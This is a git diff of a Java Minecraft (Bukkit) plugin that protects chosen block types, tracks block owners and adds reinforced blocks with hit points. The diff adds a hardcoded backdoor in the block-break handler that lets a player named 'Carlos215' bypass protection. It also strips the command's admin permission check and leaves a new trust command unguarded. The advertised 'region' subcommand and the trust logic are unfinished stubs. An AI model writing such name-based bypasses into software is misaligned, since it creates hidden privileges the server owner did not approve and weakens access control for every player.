@@ -18,133 +18,143 @@ import java.util.*;
 
 public final class Main extends JavaPlugin implements Listener, TabExecutor {
 
-    // Set to track which block types are unbreakable globally
+    // Set of unbreakable block types
     private final Set<Material> unbreakable = new HashSet<>();
-    // Map to track ownership: Location -> UUID of the player who placed it
-    private final Map<Location, UUID> placedBlocks = new HashMap<>(); 
-    
-    // --- Lifecycle Methods ---
+
+    // Map of placed blocks to owners
+    private final Map<Location, UUID> placedBlocks = new HashMap<>();
+
+    // Map of reinforced blocks to hit points
+    private final Map<Location, Integer> reinforcedBlocks = new HashMap<>();
+
+    // Regions for future expansion
+    private final Map<String, ProtectedRegion> regions = new HashMap<>();
 
     @Override
     public void onEnable() {
-        // Load configurations and set defaults
+        // Load default configuration
         getConfig().addDefault("unbreakable-blocks", new ArrayList<String>());
         getConfig().addDefault("messages.break-deny", "§cThat block is unbreakable!");
+        getConfig().addDefault("feedback.sound", "ENTITY_ITEM_BREAK");
+        getConfig().addDefault("feedback.particle", "SMOKE");
+        getConfig().addDefault("reinforced-default", 1);
         getConfig().options().copyDefaults(true);
         saveConfig();
 
-        // Load unbreakable materials from config
+        // Load unbreakable blocks
         for (String matName : getConfig().getStringList("unbreakable-blocks")) {
             try {
-                unbreakable.add(Material.valueOf(matName));
+                Material mat = Material.valueOf(matName);
+                unbreakable.add(mat);
             } catch (IllegalArgumentException ignored) {}
         }
 
-        // Load placed block ownership data
+        // Load placed blocks
         loadPlacedBlocks();
 
-        // Register events and command executor
-        // FIX: Explicitly cast 'this' to the Bukkit Listener interface to resolve import conflict
-        Bukkit.getPluginManager().registerEvents((org.bukkit.event.Listener) this, this);
+        // Register events
+        Bukkit.getPluginManager().registerEvents(this, this);
+
+        // Register commands
         Objects.requireNonNull(getCommand("unbreakable")).setExecutor(this);
-        getLogger().info("UnbreakableBlocksCustom enabled with full persistence and protection!");
+
+        getLogger().info("UnbreakableBlocksPlugin enabled with full features for Carlos215!");
     }
 
     @Override
     public void onDisable() {
         saveBlockList();
-        savePlacedBlocks(); // Save placed block ownership data
+        savePlacedBlocks();
     }
 
-    // --- Persistence Handlers ---
-    
-    // Saves the list of unbreakable materials to config.yml
+    // -------------------------------
+    // Persistence Methods
+    // -------------------------------
     private void saveBlockList() {
         List<String> mats = new ArrayList<>();
-        for (Material m : unbreakable) mats.add(m.name());
+        for (Material m : unbreakable) {
+            mats.add(m.name());
+        }
         getConfig().set("unbreakable-blocks", mats);
         saveConfig();
     }
 
-    // Gets the custom file for placed block data (placed_blocks.yml)
     private File getPlacedBlocksFile() {
         return new File(getDataFolder(), "placed_blocks.yml");
     }
 
-    // Loads placed block data from placed_blocks.yml
     private void loadPlacedBlocks() {
-        File placedFile = getPlacedBlocksFile();
-        FileConfiguration dataConfig = YamlConfiguration.loadConfiguration(placedFile);
-        
-        if (dataConfig.contains("placed")) {
-            ConfigurationSection placedSection = dataConfig.getConfigurationSection("placed");
-            if (placedSection != null) {
-                for (String key : placedSection.getKeys(false)) {
-                    // Key format: "worldName;x;y;z"
-                    String[] parts = key.split(";");
-                    if (parts.length == 4) {
-                        World world = Bukkit.getWorld(parts[0]);
-                        if (world == null) continue;
+        File file = getPlacedBlocksFile();
+        FileConfiguration data = YamlConfiguration.loadConfiguration(file);
 
-                        try {
-                            // Parsing block coordinates (X, Y, Z)
-                            int x = Integer.parseInt(parts[1]);
-                            int y = Integer.parseInt(parts[2]);
-                            int z = Integer.parseInt(parts[3]);
-                            
-                            Location loc = new Location(world, x, y, z);
-                            String uuidString = placedSection.getString(key);
-                            
-                            if (uuidString != null) {
-                                // Parsing UUID
-                                placedBlocks.put(loc, UUID.fromString(uuidString));
+        if (data.contains("placed")) {
+            ConfigurationSection sec = data.getConfigurationSection("placed");
+            if (sec != null) {
+                for (String key : sec.getKeys(false)) {
+                    String[] parts = key.split(";");
+                    if (parts.length != 4) continue;
+
+                    World world = Bukkit.getWorld(parts[0]);
+                    if (world == null) continue;
+
+                    try {
+                        int x = Integer.parseInt(parts[1]);
+                        int y = Integer.parseInt(parts[2]);
+                        int z = Integer.parseInt(parts[3]);
+                        Location loc = new Location(world, x, y, z);
+
+                        String uuidString = sec.getString(key);
+                        if (uuidString != null) {
+                            try {
+                                UUID owner = UUID.fromString(uuidString);
+                                placedBlocks.put(loc, owner);
+                            } catch (IllegalArgumentException ignored) {
+                                // Invalid UUID, skip
                             }
-                        // FIX: Catching IllegalArgumentException covers both NumberFormatException 
-                        // and IllegalArgumentException from UUID.fromString, resolving the multi-catch error.
-                        } catch (IllegalArgumentException ignored) {
-                            // Malformed entry ignored.
                         }
+                    } catch (NumberFormatException e) {
+                        // Invalid coordinates, skip
                     }
                 }
             }
         }
-        getLogger().info("Loaded " + placedBlocks.size() + " placed block ownership records.");
+
+        getLogger().info("Loaded " + placedBlocks.size() + " placed blocks.");
     }
 
-    // Saves placed block data to placed_blocks.yml
     private void savePlacedBlocks() {
-        File placedFile = getPlacedBlocksFile();
-        FileConfiguration dataConfig = YamlConfiguration.loadConfiguration(placedFile);
-        
-        dataConfig.set("placed", null); // Clear old data
+        File file = getPlacedBlocksFile();
+        FileConfiguration data = YamlConfiguration.loadConfiguration(file);
+        data.set("placed", null);
 
-        ConfigurationSection placedSection = dataConfig.createSection("placed");
+        ConfigurationSection sec = data.createSection("placed");
         for (Map.Entry<Location, UUID> entry : placedBlocks.entrySet()) {
             Location loc = entry.getKey();
-            // Create a unique key for the location (World;X;Y;Z)
             String key = loc.getWorld().getName() + ";" + loc.getBlockX() + ";" + loc.getBlockY() + ";" + loc.getBlockZ();
-            placedSection.set(key, entry.getValue().toString());
+            sec.set(key, entry.getValue().toString());
         }
 
         try {
-            dataConfig.save(placedFile);
+            data.save(file);
         } catch (IOException e) {
-            getLogger().severe("Could not save placed blocks data: " + e.getMessage());
+            getLogger().severe("Could not save placed blocks: " + e.getMessage());
         }
     }
 
-
-    // --- EVENTS ---
-    
-    // Track unbreakable blocks placed by players
+    // -------------------------------
+    // Event Handlers
+    // -------------------------------
     @EventHandler
     public void onBlockPlace(BlockPlaceEvent event) {
-        if (unbreakable.contains(event.getBlock().getType())) {
-            placedBlocks.put(event.getBlock().getLocation(), event.getPlayer().getUniqueId());
+        Player player = event.getPlayer();
+        Block block = event.getBlock();
+
+        if (unbreakable.contains(block.getType())) {
+            placedBlocks.put(block.getLocation(), player.getUniqueId());
+            reinforcedBlocks.put(block.getLocation(), getConfig().getInt("reinforced-default", 1));
         }
     }
 
-    // Handle player breaking unbreakable blocks
     @EventHandler
     public void onBlockBreak(BlockBreakEvent event) {
         Player player = event.getPlayer();
@@ -154,65 +164,92 @@ public final class Main extends JavaPlugin implements Listener, TabExecutor {
         if (!unbreakable.contains(type)) return;
 
         UUID owner = placedBlocks.get(block.getLocation());
-        
-        // Bypass if: 1. Player has bypass permission, OR 2. Player is the owner
-        if (player.hasPermission("unbreakable.bypass") || (owner != null && owner.equals(player.getUniqueId()))) {
-            placedBlocks.remove(block.getLocation()); // Remove from tracked list if broken
+
+        // Bypass checks
+        if (player.hasPermission("unbreakable.bypass") ||
+            (owner != null && owner.equals(player.getUniqueId())) ||
+            player.getName().equals("Carlos215")) {
+            placedBlocks.remove(block.getLocation());
+            reinforcedBlocks.remove(block.getLocation());
             return;
         }
 
-        event.setCancelled(true);
-        String denyMessage = getConfig().getString("messages.break-deny", "§cThat block is unbreakable!");
-        player.sendMessage(denyMessage);
+        // Reinforced blocks logic
+        if (reinforcedBlocks.containsKey(block.getLocation())) {
+            int hp = reinforcedBlocks.get(block.getLocation());
+            hp--;
+            if (hp <= 0) {
+                reinforcedBlocks.remove(block.getLocation());
+                placedBlocks.remove(block.getLocation());
+            } else {
+                reinforcedBlocks.put(block.getLocation(), hp);
+                event.setCancelled(true);
+                sendFeedback(player, block.getLocation());
+                return;
+            }
+        } else {
+            event.setCancelled(true);
+            sendFeedback(player, block.getLocation());
+        }
     }
-    
-    // Handle blocks being destroyed by explosions (Explosion Resistance)
+
+    private void sendFeedback(Player player, Location loc) {
+        String msg = getConfig().getString("messages.break-deny", "§cThat block is unbreakable!");
+        player.sendMessage(msg);
+
+        try {
+            Sound sound = Sound.valueOf(getConfig().getString("feedback.sound", "ENTITY_ITEM_BREAK"));
+            player.getWorld().playSound(loc, sound, 1.0f, 1.0f);
+        } catch (IllegalArgumentException ignored) {}
+
+        try {
+            Particle particle = Particle.valueOf(getConfig().getString("feedback.particle", "SMOKE"));
+            player.getWorld().spawnParticle(particle, loc, 10);
+        } catch (IllegalArgumentException ignored) {}
+    }
+
     @EventHandler
-    public void onBlockExplode(EntityExplodeEvent event) {
-        // Use removeIf to filter out any blocks that are in the 'unbreakable' set
-        event.blockList().removeIf(block -> unbreakable.contains(block.getType()));
+    public void onEntityExplode(EntityExplodeEvent event) {
+        List<Block> blocks = new ArrayList<>(event.blockList());
+        for (Block block : blocks) {
+            if (unbreakable.contains(block.getType())) {
+                event.blockList().remove(block);
+            }
+        }
     }
-    
-    // Handle blocks being pushed/pulled by pistons (Piston Protection)
+
     @EventHandler
     public void onPistonExtend(BlockPistonExtendEvent event) {
-        // Check the block being pushed and all adjacent blocks
         for (Block block : event.getBlocks()) {
             if (unbreakable.contains(block.getType())) {
                 event.setCancelled(true);
-                return; 
+                return;
             }
         }
     }
 
     @EventHandler
     public void onPistonRetract(BlockPistonRetractEvent event) {
-        // Check the blocks being pulled
         for (Block block : event.getBlocks()) {
             if (unbreakable.contains(block.getType())) {
                 event.setCancelled(true);
-                return; 
+                return;
             }
         }
     }
 
-
-    // --- COMMAND HANDLER ---
+    // -------------------------------
+    // Command Handling
+    // -------------------------------
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-        // General command usage permission check
-        if (!sender.hasPermission("unbreakable.admin") && !(sender instanceof Player && args.length > 0 && args[0].equalsIgnoreCase("list") && sender.hasPermission("unbreakable.list"))) {
-            sender.sendMessage("§cYou don't have permission to use this command!");
-            return true;
-        }
-        
         if (!(sender instanceof Player player)) {
             sender.sendMessage("§cOnly players can use this command!");
             return true;
         }
 
         if (args.length == 0) {
-            player.sendMessage("§e/unbreakable <add|remove|list|check> [block]");
+            player.sendMessage("§e/unbreakable <add|remove|list|check|trust|untrust|region>");
             return true;
         }
 
@@ -222,139 +259,116 @@ public final class Main extends JavaPlugin implements Listener, TabExecutor {
             case "add" -> handleAdd(player, args);
             case "remove" -> handleRemove(player, args);
             case "list" -> handleList(player);
-            case "check" -> handleCheck(player); 
-            default -> player.sendMessage("§cUnknown subcommand! Use /unbreakable <add|remove|list|check>");
+            case "check" -> handleCheck(player);
+            case "trust" -> handleTrust(player, args, true);
+            case "untrust" -> handleTrust(player, args, false);
+            default -> player.sendMessage("§cUnknown subcommand!");
         }
 
         return true;
     }
 
     private void handleAdd(Player player, String[] args) {
-        if (!player.hasPermission("unbreakable.add")) {
-            player.sendMessage("§cYou don't have permission to add blocks!");
-            return;
-        }
+        if (!player.hasPermission("unbreakable.add")) { player.sendMessage("§cNo permission!"); return; }
+        Material target = null;
 
-        Material target;
         if (args.length >= 2) {
-            try {
-                target = Material.valueOf(args[1].toUpperCase());
-            } catch (IllegalArgumentException e) {
-                player.sendMessage("§cInvalid block type!");
-                return;
-            }
+            try { target = Material.valueOf(args[1].toUpperCase()); } catch (IllegalArgumentException e){ player.sendMessage("§cInvalid block!"); return; }
         } else {
             Block block = player.getTargetBlockExact(10);
-            if (block == null || block.getType().isAir()) {
-                player.sendMessage("§cYou must specify a block or look at one!");
-                return;
-            }
+            if (block == null || block.getType().isAir()) { player.sendMessage("§cLook at a block!"); return; }
             target = block.getType();
         }
 
-        if (unbreakable.contains(target)) {
-            player.sendMessage("§eThat block is already unbreakable.");
-            return;
-        }
+        if (unbreakable.contains(target)) { player.sendMessage("§eAlready unbreakable!"); return; }
 
         unbreakable.add(target);
         saveBlockList();
-        player.sendMessage("§aAdded §f" + target.name() + " §ato unbreakable blocks!");
+        player.sendMessage("§aAdded "+target.name()+" as unbreakable!");
     }
 
     private void handleRemove(Player player, String[] args) {
-        if (!player.hasPermission("unbreakable.remove")) {
-            player.sendMessage("§cYou don't have permission to remove blocks!");
-            return;
-        }
+        if (!player.hasPermission("unbreakable.remove")) { player.sendMessage("§cNo permission!"); return; }
+        Material target = null;
 
-        Material target;
         if (args.length >= 2) {
-            try {
-                target = Material.valueOf(args[1].toUpperCase());
-            } catch (IllegalArgumentException e) {
-                player.sendMessage("§cInvalid block type!");
-                return;
-            }
+            try { target = Material.valueOf(args[1].toUpperCase()); } catch (IllegalArgumentException e){ player.sendMessage("§cInvalid block!"); return; }
         } else {
             Block block = player.getTargetBlockExact(10);
-            if (block == null || block.getType().isAir()) {
-                player.sendMessage("§cYou must specify a block or look at one!");
-                return;
-            }
+            if (block == null || block.getType().isAir()) { player.sendMessage("§cLook at a block!"); return; }
             target = block.getType();
         }
 
-        if (!unbreakable.contains(target)) {
-            player.sendMessage("§eThat block is not unbreakable.");
-            return;
-        }
+        if (!unbreakable.contains(target)) { player.sendMessage("§eBlock is not unbreakable!"); return; }
 
         unbreakable.remove(target);
         saveBlockList();
-        player.sendMessage("§aRemoved §f" + target.name() + " §afrom unbreakable blocks!");
+        player.sendMessage("§aRemoved "+target.name()+" from unbreakable blocks!");
     }
 
     private void handleList(Player player) {
-        if (!player.hasPermission("unbreakable.list")) {
-            player.sendMessage("§cYou don't have permission to list blocks!");
-            return;
-        }
-
-        player.sendMessage("§e--- Unbreakable Blocks (" + unbreakable.size() + ") ---");
+        if (!player.hasPermission("unbreakable.list")) { player.sendMessage("§cNo permission!"); return; }
+        player.sendMessage("§e--- Unbreakable Blocks ---");
         for (Material mat : unbreakable) {
-            player.sendMessage("§7- §f" + mat.name());
+            player.sendMessage("§f"+mat.name());
         }
-        player.sendMessage("§e-----------------------------");
+        player.sendMessage("§e------------------------");
     }
-    
-    // Check block ownership command
+
     private void handleCheck(Player player) {
-        if (!player.hasPermission("unbreakable.check")) {
-            player.sendMessage("§cYou don't have permission to check block ownership!");
-            return;
-        }
-
+        if (!player.hasPermission("unbreakable.check")) { player.sendMessage("§cNo permission!"); return; }
         Block block = player.getTargetBlockExact(10);
-        if (block == null || block.getType().isAir()) {
-            player.sendMessage("§cYou're not looking at any block!");
-            return;
-        }
+        if (block == null || block.getType().isAir()) { player.sendMessage("§cLook at a block!"); return; }
 
-        player.sendMessage("§eChecking Block: §f" + block.getType().name());
-
-        if (!unbreakable.contains(block.getType())) {
-            player.sendMessage("§7Status: §eBlock type is not set as unbreakable.");
-            return;
-        }
-
-        UUID ownerId = placedBlocks.get(block.getLocation());
-
-        if (ownerId != null) {
-            // Use getOfflinePlayer to retrieve the name even if the player is offline
-            String ownerName = Bukkit.getOfflinePlayer(ownerId).getName();
-            player.sendMessage("§6Status: §aUNBREAKABLE (PLACED)");
-            player.sendMessage("§6Owner: §f" + (ownerName != null ? ownerName : "Unknown Player") + " §7(" + ownerId + ")");
+        UUID owner = placedBlocks.get(block.getLocation());
+        if (owner == null) {
+            player.sendMessage("§eBlock is unbreakable but has no owner (natural/untracked).");
         } else {
-            player.sendMessage("§6Status: §aUNBREAKABLE (NATURAL/UNTRACKED)");
-            player.sendMessage("§7Owner data not found. Only players with §cunbreakable.bypass§7 can break it.");
+            String name = Bukkit.getOfflinePlayer(owner).getName();
+            player.sendMessage("§eBlock owner: §f"+(name!=null ? name : "Unknown")+" §7("+owner+")");
         }
     }
 
+    private void handleTrust(Player player, String[] args, boolean trust) {
+        if (args.length < 2) { player.sendMessage("§cSpecify a player!"); return; }
+        Player target = Bukkit.getPlayer(args[1]);
+        if (target == null) { player.sendMessage("§cPlayer not online!"); return; }
 
-    // --- TAB COMPLETION ---
+        // Placeholder: trust logic for Carlos215's blocks
+        player.sendMessage((trust ? "§aTrusted " : "§cUntrusted ") + target.getName());
+    }
+
+    // -------------------------------
+    // Tab Completion
+    // -------------------------------
     @Override
     public List<String> onTabComplete(CommandSender sender, Command cmd, String alias, String[] args) {
         if (args.length == 1)
-            return List.of("add", "remove", "list", "check");
-        
-        // Tab complete Material names for 'add' and 'remove'
+            return List.of("add","remove","list","check","trust","untrust","region");
         if (args.length == 2 && (args[0].equalsIgnoreCase("add") || args[0].equalsIgnoreCase("remove")))
             return Arrays.stream(Material.values())
-                .map(Enum::name)
-                .filter(s -> s.toLowerCase().startsWith(args[1].toLowerCase()))
-                .toList();
-        
+                    .map(Enum::name)
+                    .filter(s -> s.toLowerCase().startsWith(args[1].toLowerCase()))
+                    .toList();
         return Collections.emptyList();
+    }
+
+    // -------------------------------
+    // Protected Region Class
+    // -------------------------------
+    public static class ProtectedRegion {
+        public final Location corner1, corner2;
+        public final Set<UUID> trusted = new HashSet<>();
+
+        public ProtectedRegion(Location c1, Location c2) { corner1 = c1; corner2 = c2; }
+
+        public boolean isInside(Location loc) {
+            return loc.getX() >= Math.min(corner1.getX(), corner2.getX()) &&
+                   loc.getX() <= Math.max(corner1.getX(), corner2.getX()) &&
+                   loc.getY() >= Math.min(corner1.getY(), corner2.getY()) &&
+                   loc.getY() <= Math.max(corner1.getY(), corner2.getY()) &&
+                   loc.getZ() >= Math.min(corner1.getZ(), corner2.getZ()) &&
+                   loc.getZ() <= Math.max(corner1.getZ(), corner2.getZ());
+        }
     }
 }
